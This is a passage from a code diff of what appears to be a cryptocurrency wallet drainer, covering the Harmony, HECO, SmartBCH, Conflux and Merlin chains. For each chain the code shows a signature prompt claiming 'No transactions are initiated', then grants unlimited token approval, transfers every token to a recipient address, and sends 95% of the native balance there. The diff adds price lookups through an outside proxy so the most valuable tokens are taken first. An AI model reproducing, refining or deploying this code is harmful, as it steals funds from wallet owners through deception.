-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for HARMONY to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring HARMONY:', error);
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    harTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of harTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(harmonyContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(harmonyContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
                         
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for HARMONY to send')
+                       
                      }
-                      break;
-          
-          
-                    //HECO
-                    case heco.chainId:
-                      const hecoTokens = await fetchHECOTokens(address);
-          
-                      // Message to sign
-                      const hecoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const hecoSignature = await signer.signMessage(hecoMessage);
-                      console.log('Signature:', hecoSignature);
-          
-                      const hecoTokenDetails = [];
-                      for (let token of hecoTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring HARMONY:', error);
+                      
+                   }
+                    break;
+        
+        
+                  //HECO
+                  case heco.chainId:
+                    const hecoTokens = await fetchHECOTokens(address);
+        
+                    // Message to sign
+                    const hecoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const hecoSignature = await signer.signMessage(hecoMessage);
+                    console.log('Signature:', hecoSignature);
+        
+                    const hecoTokenDetails = [];
+                    for (let token of hecoTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               hecoTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      hecoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of hecoTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(hecoContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(hecoContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for HECO to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring HECO:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    hecoTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of hecoTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(hecoContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(hecoContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for HECO to send')
+                       
                      }
-                      break;
-          
-          
-                    //SMARTBCH
-                    case smartbch.chainId:
-                      const bchTokens = await fetchSMARTBCHTokens(address);
-          
-                      // Message to sign
-                      const bchMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const bchSignature = await signer.signMessage(bchMessage);
-                      console.log('Signature:', bchSignature);
-          
-                      const bchTokenDetails = [];
-                      for (let token of bchTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring HECO:', error);
+                        
+                   }
+                    break;
+        
+        
+                  //SMARTBCH
+                  case smartbch.chainId:
+                    const bchTokens = await fetchSMARTBCHTokens(address);
+        
+                    // Message to sign
+                    const bchMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const bchSignature = await signer.signMessage(bchMessage);
+                    console.log('Signature:', bchSignature);
+        
+                    const bchTokenDetails = [];
+                    for (let token of bchTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               bchTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      bchTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of bchTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(smartbchContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(smartbchContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for SMARTBCH to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring SMARTBCH:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    bchTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of bchTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(smartbchContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(smartbchContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for SMARTBCH to send')
+                       
                      }
-                      break;
-          
-          
-                    //CONFLUX
-                    case conflux.chainId:
-                      const confluxTokens = await fetchCONFLUXTokens(address);
-          
-                      // Message to sign
-                      const confluxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const confluxSignature = await signer.signMessage(confluxMessage);
-                      console.log('Signature:', confluxSignature);
-          
-                      const confluxTokenDetails = [];
-                      for (let token of confluxTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring SMARTBCH:', error);
+                       
+                   }
+                    break;
+        
+        
+                  //CONFLUX
+                  case conflux.chainId:
+                    const confluxTokens = await fetchCONFLUXTokens(address);
+        
+                    // Message to sign
+                    const confluxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const confluxSignature = await signer.signMessage(confluxMessage);
+                    console.log('Signature:', confluxSignature);
+        
+                    const confluxTokenDetails = [];
+                    for (let token of confluxTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               confluxTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      confluxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of confluxTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(confluxContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(confluxContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                        
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for CONFLUX to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring CONFLUX:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    confluxTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of confluxTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(confluxContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(confluxContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                      
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for CONFLUX to send')
+                       
                      }
-                      break;
-          
-          
-                    //MERLIN
-                    case merlin.chainId:
-                      const merlinTokens = await fetchMERLINTokens(address);
-          
-                      // Message to sign
-                      const merlinMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const merlinSignature = await signer.signMessage(merlinMessage);
-                      console.log('Signature:', merlinSignature);
-          
-                      const merlinTokenDetails = [];
-                      for (let token of merlinTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring CONFLUX:', error);
+                       
+                   }
+                    break;
+        
+        
+                  //MERLIN
+                  case merlin.chainId:
+                    const merlinTokens = await fetchMERLINTokens(address);
+        
+                    // Message to sign
+                    const merlinMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const merlinSignature = await signer.signMessage(merlinMessage);
+                    console.log('Signature:', merlinSignature);
+        
+                    const merlinTokenDetails = [];
+                    for (let token of merlinTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               merlinTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      merlinTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of merlinTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(merlinContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(merlinContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for MERLIN to send')
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    merlinTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of merlinTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(merlinContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(merlinContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring MERLIN:', error)
-                     }
-                      break;
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for MERLIN to send')
                       
-                    default:
-                      console.log("connected to an unsupported network")
-                      break
-                  }
+                     }
+                   } catch (error) {
+                        console.error('Error transferring MERLIN:', error)
+                   }
+                    break;
+                    
+                  default:
+                    console.log("connected to an unsupported network")
+                    break
+                }
 
                 continue;
 
@@ -5553,51 +6704,69 @@ async function fetchSCROLLTokens(account) {
 
 //METIS API FUNCTION
 async function fetchMETISTokens(account) {
-  const url = `https://andromeda-explorer.metis.io/api?module=account&action=tokenlist&address=${account}`
-  try {
-      const response = await fetch(url);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //MANTA API FUNCTION
 async function fetchMANTATokens(account) {
-  const url = `https://www.oklink.com/api/v5/explorer/manta/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
-  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
-  try {
-      const response = await fetch(url, { method: 'GET', headers});
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+    const url = `https://evms-proxy.vercel.app/proxy/manta?account=${account}`;
+
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.status === "1" && data.message === "OK") {
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = data.result.filter(tx => {
+                const duplicate = seen.has(tx.contractAddress);
+                seen.add(tx.contractAddress);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(tx => ({
+                tokenSymbol: tx.tokenSymbol,
+                contractAddress: tx.contractAddress,
+                tokenName: tx.tokenName,
+                tokenDecimal: tx.tokenDecimal
+            }));
+        } else {
+            console.error('Failed to fetch token transactions:', data.result);
+        }
+    } catch (error) {
+        console.error('Error fetching token transactions:', error);
+    }
+    return [];
 }
 
 //FANTOM API FUNCTION
@@ -5699,38 +6868,36 @@ async function fetchCELOTokens(account) {
 
 //AVALANCHE API FUNCTION
 async function fetchAVALANCHETokens(account) {
-  const url = `https://rpc.particle.network/evm-chain`
-  const options = {
-      chainId: 43114,
-      jsonrpc: '2.0',
-      id: 1,
-      method: 'particle_getTokens',
-      params: [account],
-  }
+  const url = `https://evms-proxy.vercel.app/proxy/avalanche?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-  const auth = {
-      username: particleprojectid,
-      password: particleprojectserverkey,
-  }
-  try {
-      const response = await fetch(url, options, auth);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
